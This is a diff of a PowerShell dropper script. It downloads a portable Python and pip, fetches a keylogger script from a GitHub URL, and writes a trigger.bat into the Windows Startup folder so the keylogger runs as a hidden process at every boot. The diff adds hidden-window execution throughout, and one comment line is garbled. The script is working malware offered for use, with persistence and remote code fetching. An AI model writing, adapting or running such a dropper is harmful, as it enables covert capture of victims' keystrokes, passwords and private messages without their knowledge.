@@ -5,75 +5,79 @@
 
 $source = 'https://www.python.org/ftp/python/3.11.1/python-3.11.1-embed-amd64.zip';
 $user = [System.Environment]::UserName;
-$destination = "C:\Users\$user\Downloads\test.zip";
+$destination = "C:\Temp\Python3.zip";
 
 Invoke-WebRequest -Uri $source -OutFile $destination;
 
 
 #Unzipping a zip file
 
-Expand-Archive -Path $destination -DestinationPath "C:\Users\$user\Downloads\test" -Force;
+Expand-Archive -Path $destination -DestinationPath "C:\Temp\Python3" -Force;
 
 
 #Downloading PIP
 
 $pipdownloadurl = 'https://bootstrap.pypa.io/get-pip.py';
 
-$destination4pip = "C:\Users\$user\Downloads\get-pip.py";
+$destination4pip = "C:\Temp\get-pip.py";
 
 Invoke-WebRequest -Uri $pipdownloadurl -OutFile $destination4pip;
 
 
 #Linking Pip with Python (with interface)
-#start C:\Users\$user\Downloads\test\python.exe C:\Users\$user\Downloads\get-pip.py
+#start C:\Temp\Python3\python.exe C:\Temp\get-pip.py
 
 #Linking Pip with Python (hiding the interface)
-start -WindowStyle Hidden C:\Users\$user\Downloads\test\python.exe C:\Users\$user\Downloads\get-pip.py
+start -WindowStyle Hidden C:\Temp\Python3\python.exe C:\Temp\get-pip.py
 
 # Giving time the computer getting the PIP ready
 timeout 25
 
 #Getting inside the python folder
 
-cd C:\Users\$user\Downloads\test
+cd C:\Temp\Python3
 
-#Replacing a file that gets pip working
+#Removing the old python311._pth file
 
 Remove-Item python311._pth
 
+#Downloading the new edited python311._pth file, that allows PIP to run, without installing python on computer
 
 $sourceUrl = 'https://raw.githubusercontent.com/OlegLeo/RemoteScriptTest/main/python311._pth';
 $user = [System.Environment]::UserName;
-$destination4replacement = "C:\Users\$user\Downloads\test\python311._pth";
+$destination4replacement = "C:\Temp\Python3\python311._pth";
 
 Invoke-WebRequest -Uri $sourceUrl -OutFile $destination4replacement;
 
 
 # Installing the required modules
 
-powershell -c C:\Users\$user\Downloads\test\scripts\pip.exe install keyboard;
-powershell -c C:\Users\$user\Downloads\test\scripts\pip.exe install ssl;
-powershell -c C:\Users\$user\Downloads\test\scripts\pip.exe install email;
+start powershell -WindowStyle Hidden "C:\Temp\Python3\scripts\pip.exe install keyboard";
+start powershell -WindowStyle Hidden "C:\Temp\Python3\scripts\pip.exe install ssl";
+start powershell -WindowStyle Hidden "C:\Temp\Python3\scripts\pip.exe install email";
 
 
-# Downloading the keylogger script
+
+timeout 15
+
+# Downloading the keylogger python script
 
 $sourceKeyLogger = 'https://raw.githubusercontent.com/OlegLeo/RemoteScriptTest/main/keyloggerscript.py';
 $user = [System.Environment]::UserName;
-$destination4keylogger = "C:\Users\$user\Downloads\keyloggerscript.py";
+$destination4keylogger = "C:\Temp\keyloggerscript.py";
 
 Invoke-WebRequest -Uri $sourceKeyLogger -OutFile $destination4keylogger;
 
 
 
-# Creating trigger file on startup for keylogger
+# Creating trigger file on startup for keylogger, so that everytime the computer starts, the keyloggerscript.py is triggerd to run as a hidden process
+
 
 New-Item "C:\Users\$user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\trigger.bat";
 
-Set-Content "C:\Users\$user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\trigger.bat" 'start powershell "$user = [System.Environment]::UserName; powershell -c C:\Users\$user\Downloads\test\python.exe C:\Users\$user\Downloads\keyloggerscript.py" ';
+Set-Content "C:\Users\$user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\trigger.bat" "start powershell ""start powershell -WindowStyle Hidden 'C:\Temp\Python3\python.exe C:\Temp\keyloggerscript.py'"";"
 
 
+# Running keylogger scripTemp\Python3\python.exe C:\Temp\keyloggerscript.py
 
-# Running keylogger script
-
-powershell -c C:\Users\$user\Downloads\test\python.exe C:\Users\$user\Downloads\keyloggerscript.py
+powershell -c C:\Temp\Python3\python.exe C:\Temp\keyloggerscript.py
